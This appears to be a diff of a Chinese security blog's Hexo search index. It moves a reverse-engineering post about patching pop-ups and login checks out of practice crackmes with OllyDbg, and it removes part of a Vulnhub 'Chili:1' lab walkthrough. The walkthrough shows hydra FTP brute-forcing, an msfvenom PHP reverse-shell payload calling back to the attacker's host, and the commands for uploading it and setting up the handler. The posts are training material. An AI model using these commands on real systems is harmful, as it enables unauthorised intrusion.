+<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
+<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
+<p><strong>ctfshow -web-4</strong></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件包含</category>
       </categories>
   </entry>
   <entry>
@@ -3600,95 +3600,6 @@ index.php</p>
       <categories>
         <category>前端</category>
         <category>docker</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>逆向之广告弹窗去除破解练习</title>
-    <url>/2021/04/15/%E9%80%86%E5%90%91%E4%B9%8B%E5%B9%BF%E5%91%8A%E5%BC%B9%E7%AA%97%E5%8E%BB%E9%99%A4%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<p><strong>所需工具：</strong><br>
-1.OllyDbg 下载地址：<a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版Ollydbg.rar</a><br>
-2.C32Asm 下载地址： <a href="http://down.52pojie.cn/Tools/Disassemblers/C32Asm.rar">C32Asm.rar</a><br>
-3.ProcMon 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procmon.exe">Procmon.exe</a><br>
-4.ProcExp 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procexp.exe">Procexp.exe</a></p>
-<h2 id="练习一"><a class="header-anchor" href="#练习一">¶</a>练习一</h2>
-<h3 id="一-去网页弹出"><a class="header-anchor" href="#一-去网页弹出">¶</a>一:去网页弹出</h3>
-<p>弹网页我们使用<strong>C32asm</strong>去除</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415175439914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>查找后发现第一个没用</p>
-<p>第二个有 explorer字眼</p>
-<p><img src="https://img-blog.csdnimg.cn/2021041517560620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>直接用 00填充</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415175709181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>保存下来发现弹网页的都消失了</p>
-<h3 id="二-去除弹窗"><a class="header-anchor" href="#二-去除弹窗">¶</a>二:去除弹窗</h3>
-<p><img src="https://img-blog.csdnimg.cn/20210415183716895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>我们首先要知道一些windows的api</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.MessageBoxA&#x2F;W</span><br><span class="line">消息框</span><br><span class="line"></span><br><span class="line">2.ShellExecuteA&#x2F;W</span><br><span class="line">3.WinExec</span><br><span class="line">4.CreateProcessA&#x2F;W</span><br><span class="line">弹网页</span><br><span class="line"></span><br><span class="line">5.CreateThread</span><br><span class="line"></span><br><span class="line">6.RegCreateKeyExA&#x2F;W</span><br><span class="line">7.RegOpenKeyExA&#x2F;W</span><br><span class="line">8.RegDeleteKeyExA&#x2F;W</span><br><span class="line">注册表</span><br><span class="line"></span><br><span class="line">CreateWindowExA&#x2F;w</span><br><span class="line">DialogBoxParamA&#x2F;W</span><br><span class="line">弹窗口</span><br></pre></td></tr></table></figure>
-<p>将我们去除网页弹窗的exe拖入od</p>
-<p>发现我们的弹窗是<strong>来试试我的程序啊</strong></p>
-<p>我们智能搜索到那里 在call函数下断点 f9运行  通过右下角堆栈列表发现他有4个参数</p>
-<p>我们nop掉这4个参数和这个call函数 (注意不能只nop掉这个call函数 否则会在后面出错)</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415184028494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="练习二"><a class="header-anchor" href="#练习二">¶</a>练习二</h2>
-<p>这个程序会自动将ie主页更改为52pojie 并且过一段时间会右下角弹窗</p>
-<p>由于我的环境问题 我就不演示ie主页篡改的修复只讲讲思路</p>
-<p>将文件拉入od 智能搜索发现 篡改ie的地方 进去发现一大堆函数都是它的  我们直接将段头部 改为 retn</p>
-<p>但是要注意与段尾的retn对应 否则会出错</p>
-<p>然后解决一个弹页面的弹窗</p>
-<p>智能搜索 看到explorer字眼 直接nop就行</p>
-<p>接下来去除内置的窗口</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415205101444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>我们去除内置窗口可以使用<strong>Restorator</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/20210415204922188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>最后来讲去除右下角弹窗</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415193300253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>因为我已经知道这个广告是 dialogbox的api</p>
-<p>所以我直接  CTRL+ALT+G 搜索然后下断点</p>
-<p>在函数头直接retn 成功删除了这个广告</p>
-<p><img src="https://img-blog.csdnimg.cn/20210415203302184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="练习三"><a class="header-anchor" href="#练习三">¶</a>练习三</h2>
-<p>去除多重弹窗</p>
-<p>首先是这个</p>
-<p><img src="C:%5CUsers%5Cwh1tecell%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419221228996.png" alt="image-20210419221228996"></p>
-<p>只能搜索这个弹窗信息 je改成 jne或者 jmp</p>
-<p><img src="https://img-blog.csdnimg.cn/20210419221053816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>修改完又弹出登录失败 继续跟进更改</p>
-<p><strong>je改成 nop</strong>   改成 jne或者jmp是没用的 还会导致直接跳过登录成功 到达登录失败</p>
-<p><img src="https://img-blog.csdnimg.cn/20210419221511157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>CTRL+P可查看历史修改命令</p>
-<h2 id="练习四"><a class="header-anchor" href="#练习四">¶</a>练习四</h2>
-<p>这题有点小绕</p>
-<p>打开程序发现智能搜索无法搜索到登录失败</p>
-<p>因为编写软件者在编写读取关键字符串的代码上做了手脚，导致我们用OD搜不到 做了手脚</p>
-<p><img src="https://img-blog.csdnimg.cn/20210420195403642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>我们现在用鼠标按一下下图中蓝色方框内的“M”按钮，M代表程序的内存空间</p>
-<p>在内存空间查找登录失败的关键字</p>
-<p>复制地址</p>
-<p><img src="https://img-blog.csdnimg.cn/20210420195747577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>在反汇编窗口查找  <strong>00481BAF</strong>  然后跟随到 数据窗口 在数据窗口下内存断点 至于为什么不F2下断点 因为不管用它停不下来 所以用这个方法</p>
-<p><img src="https://img-blog.csdnimg.cn/20210420195953341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>F9运行 然后删除内存断点  单步F8运行直到 弹窗弹出登录失败  红色箭头就是弹窗出失败的地方</p>
-<p><img src="https://img-blog.csdnimg.cn/20210420200523317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>贴一张大佬的图  把最上面的je nop掉就能成功了</p>
-<p><img src="https://img-blog.csdnimg.cn/20210420201858632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="练习五"><a class="header-anchor" href="#练习五">¶</a>练习五</h2>
-<p>这个练习在你账号密码失败的时候不会弹出提示窗口</p>
-<p>我们用常用的断点位置，就是读取输入的账号和密码的代码位置。</p>
-<p>程序在运行时怎么才能读取我们输入的账号和密码呢？通常会用操作系统提供的函数，最常用是一个函数是GetwindowsTextA，这个函数和以前我们说的弹出信息框的函数MessageBoxA一样，都是系统提供的功能函数，一个功能是取窗口内的输入文本，一个是弹出信息框。</p>
-<p>我们在OD里下GetwindowsTextA函数断点。下图就是断点位置</p>
-<p><img src="https://img-blog.csdnimg.cn/20210421111349116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>F9 运行到那里  然后 删除内存断点</p>
-<p>F8单步运行 重新跳过几次刚开始断点的位置来到下图位置</p>
-<p><img src="https://img-blog.csdnimg.cn/2021042111150834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>到下图位置</p>
-<p><img src="https://img-blog.csdnimg.cn/20210421112525834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这个跳转就是关键的跳转，红色箭头指的位置就是弹出新窗口的CALL</p>
-<p>这个需要一点经验，因为我看到这个CALL上面的参数我就知道是一个窗口的特征代码，看到004012AC这句代码 PUSH 5201008了吗？</p>
-<p>5201008就是易语言编写的程序的窗口ID，就是一个窗口的身份标号。当然如果是其他语言，就不是这样的特征了。</p>
-]]></content>
-      <categories>
-        <category>逆向</category>
-        <category>windows逆向</category>
       </categories>
   </entry>
   <entry>
@@ -3805,6 +3716,95 @@ index.php</p>
       <categories>
         <category>逆向</category>
         <category>逆向基础</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>逆向之广告弹窗去除破解练习</title>
+    <url>/2021/04/15/%E9%80%86%E5%90%91%E4%B9%8B%E5%B9%BF%E5%91%8A%E5%BC%B9%E7%AA%97%E5%8E%BB%E9%99%A4%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<p><strong>所需工具：</strong><br>
+1.OllyDbg 下载地址：<a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版Ollydbg.rar</a><br>
+2.C32Asm 下载地址： <a href="http://down.52pojie.cn/Tools/Disassemblers/C32Asm.rar">C32Asm.rar</a><br>
+3.ProcMon 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procmon.exe">Procmon.exe</a><br>
+4.ProcExp 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procexp.exe">Procexp.exe</a></p>
+<h2 id="练习一"><a class="header-anchor" href="#练习一">¶</a>练习一</h2>
+<h3 id="一-去网页弹出"><a class="header-anchor" href="#一-去网页弹出">¶</a>一:去网页弹出</h3>
+<p>弹网页我们使用<strong>C32asm</strong>去除</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415175439914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查找后发现第一个没用</p>
+<p>第二个有 explorer字眼</p>
+<p><img src="https://img-blog.csdnimg.cn/2021041517560620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>直接用 00填充</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415175709181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>保存下来发现弹网页的都消失了</p>
+<h3 id="二-去除弹窗"><a class="header-anchor" href="#二-去除弹窗">¶</a>二:去除弹窗</h3>
+<p><img src="https://img-blog.csdnimg.cn/20210415183716895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们首先要知道一些windows的api</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.MessageBoxA&#x2F;W</span><br><span class="line">消息框</span><br><span class="line"></span><br><span class="line">2.ShellExecuteA&#x2F;W</span><br><span class="line">3.WinExec</span><br><span class="line">4.CreateProcessA&#x2F;W</span><br><span class="line">弹网页</span><br><span class="line"></span><br><span class="line">5.CreateThread</span><br><span class="line"></span><br><span class="line">6.RegCreateKeyExA&#x2F;W</span><br><span class="line">7.RegOpenKeyExA&#x2F;W</span><br><span class="line">8.RegDeleteKeyExA&#x2F;W</span><br><span class="line">注册表</span><br><span class="line"></span><br><span class="line">CreateWindowExA&#x2F;w</span><br><span class="line">DialogBoxParamA&#x2F;W</span><br><span class="line">弹窗口</span><br></pre></td></tr></table></figure>
+<p>将我们去除网页弹窗的exe拖入od</p>
+<p>发现我们的弹窗是<strong>来试试我的程序啊</strong></p>
+<p>我们智能搜索到那里 在call函数下断点 f9运行  通过右下角堆栈列表发现他有4个参数</p>
+<p>我们nop掉这4个参数和这个call函数 (注意不能只nop掉这个call函数 否则会在后面出错)</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415184028494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="练习二"><a class="header-anchor" href="#练习二">¶</a>练习二</h2>
+<p>这个程序会自动将ie主页更改为52pojie 并且过一段时间会右下角弹窗</p>
+<p>由于我的环境问题 我就不演示ie主页篡改的修复只讲讲思路</p>
+<p>将文件拉入od 智能搜索发现 篡改ie的地方 进去发现一大堆函数都是它的  我们直接将段头部 改为 retn</p>
+<p>但是要注意与段尾的retn对应 否则会出错</p>
+<p>然后解决一个弹页面的弹窗</p>
+<p>智能搜索 看到explorer字眼 直接nop就行</p>
+<p>接下来去除内置的窗口</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415205101444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们去除内置窗口可以使用<strong>Restorator</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20210415204922188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>最后来讲去除右下角弹窗</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415193300253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>因为我已经知道这个广告是 dialogbox的api</p>
+<p>所以我直接  CTRL+ALT+G 搜索然后下断点</p>
+<p>在函数头直接retn 成功删除了这个广告</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415203302184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="练习三"><a class="header-anchor" href="#练习三">¶</a>练习三</h2>
+<p>去除多重弹窗</p>
+<p>首先是这个</p>
+<p><img src="C:%5CUsers%5Cwh1tecell%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419221228996.png" alt="image-20210419221228996"></p>
+<p>只能搜索这个弹窗信息 je改成 jne或者 jmp</p>
+<p><img src="https://img-blog.csdnimg.cn/20210419221053816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>修改完又弹出登录失败 继续跟进更改</p>
+<p><strong>je改成 nop</strong>   改成 jne或者jmp是没用的 还会导致直接跳过登录成功 到达登录失败</p>
+<p><img src="https://img-blog.csdnimg.cn/20210419221511157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>CTRL+P可查看历史修改命令</p>
+<h2 id="练习四"><a class="header-anchor" href="#练习四">¶</a>练习四</h2>
+<p>这题有点小绕</p>
+<p>打开程序发现智能搜索无法搜索到登录失败</p>
+<p>因为编写软件者在编写读取关键字符串的代码上做了手脚，导致我们用OD搜不到 做了手脚</p>
+<p><img src="https://img-blog.csdnimg.cn/20210420195403642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们现在用鼠标按一下下图中蓝色方框内的“M”按钮，M代表程序的内存空间</p>
+<p>在内存空间查找登录失败的关键字</p>
+<p>复制地址</p>
+<p><img src="https://img-blog.csdnimg.cn/20210420195747577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>在反汇编窗口查找  <strong>00481BAF</strong>  然后跟随到 数据窗口 在数据窗口下内存断点 至于为什么不F2下断点 因为不管用它停不下来 所以用这个方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210420195953341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>F9运行 然后删除内存断点  单步F8运行直到 弹窗弹出登录失败  红色箭头就是弹窗出失败的地方</p>
+<p><img src="https://img-blog.csdnimg.cn/20210420200523317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>贴一张大佬的图  把最上面的je nop掉就能成功了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210420201858632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="练习五"><a class="header-anchor" href="#练习五">¶</a>练习五</h2>
+<p>这个练习在你账号密码失败的时候不会弹出提示窗口</p>
+<p>我们用常用的断点位置，就是读取输入的账号和密码的代码位置。</p>
+<p>程序在运行时怎么才能读取我们输入的账号和密码呢？通常会用操作系统提供的函数，最常用是一个函数是GetwindowsTextA，这个函数和以前我们说的弹出信息框的函数MessageBoxA一样，都是系统提供的功能函数，一个功能是取窗口内的输入文本，一个是弹出信息框。</p>
+<p>我们在OD里下GetwindowsTextA函数断点。下图就是断点位置</p>
+<p><img src="https://img-blog.csdnimg.cn/20210421111349116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>F9 运行到那里  然后 删除内存断点</p>
+<p>F8单步运行 重新跳过几次刚开始断点的位置来到下图位置</p>
+<p><img src="https://img-blog.csdnimg.cn/2021042111150834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>到下图位置</p>
+<p><img src="https://img-blog.csdnimg.cn/20210421112525834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这个跳转就是关键的跳转，红色箭头指的位置就是弹出新窗口的CALL</p>
+<p>这个需要一点经验，因为我看到这个CALL上面的参数我就知道是一个窗口的特征代码，看到004012AC这句代码 PUSH 5201008了吗？</p>
+<p>5201008就是易语言编写的程序的窗口ID，就是一个窗口的身份标号。当然如果是其他语言，就不是这样的特征了。</p>
+]]></content>
+      <categories>
+        <category>逆向</category>
+        <category>windows逆向</category>
       </categories>
   </entry>
   <entry>
@@ -6335,77 +6335,6 @@ $res=unserialize(@$select);
       <categories>
         <category>前端</category>
         <category>hexo</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Vulnhub靶场练习</title>
-    <url>/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<h2 id="Chili-1"><a class="header-anchor" href="#Chili-1">¶</a>Chili:1</h2>
-<h3 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h3>
-<p><a href="https://www.vulnhub.com/entry/chili-1,558/">https://www.vulnhub.com/entry/chili-1,558/</a></p>
-<p>下载https://download.vulnhub.com/chili/Chili.ova  然后右键用vmware打开即可</p>
-<p>我这里使用的nat模式连接</p>
-<h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.94.197&#x2F;24</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210617123905206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -O -p-  192.168.94.247</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210617124251872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现开启了 21 ftp端口</p>
-<h3 id="正式开始"><a class="header-anchor" href="#正式开始">¶</a>正式开始</h3>
-<p>访问 ip的 80端口  发现啥也没有</p>
-<p>看到提示</p>
-<ul>
-<li>Hint : “If you ever get stuck, try again with the name of the lab”</li>
-</ul>
-<p>感觉是爆破ftp 获得密码</p>
-<p>账号就用提示的 chili</p>
-<p>密码脚本用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l chili -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f -V ftp:&#x2F;&#x2F;192.168.94.247</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210617141246613.png" alt="在这里插入图片描述"></p>
-<p>发现了密码</p>
-<p>直接ftp登录吧</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.94.247</span><br></pre></td></tr></table></figure>
-<p>然后用 msf拿个shell</p>
-<p>进入网站根目录，发现有隐藏文件，且.nano是具有最高权限的目录文件，考虑在该目录下传入木马</p>
-<p>先生成木马</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.94.197 LPORT&#x3D;2233 -f raw  &gt; shell.php</span><br></pre></td></tr></table></figure>
-<p>然后将该木马传到靶机的.nano目录下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;shell.php  aa.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210617151500436.png" alt="在这里插入图片描述"></p>
-<p>目前aa.php没有可执行权限，给它赋予最高权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 aa.php</span><br></pre></td></tr></table></figure>
-<p>成功上传后，这里我们通过msf反弹shell，在kali端口开启端口监听，然后通过浏览器访问我们的木马：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.94.197</span><br><span class="line">set LPORT 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>可以看到建立连接了</p>
-<p><img src="https://img-blog.csdnimg.cn/20210617151252649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>然后进入shell模式</p>
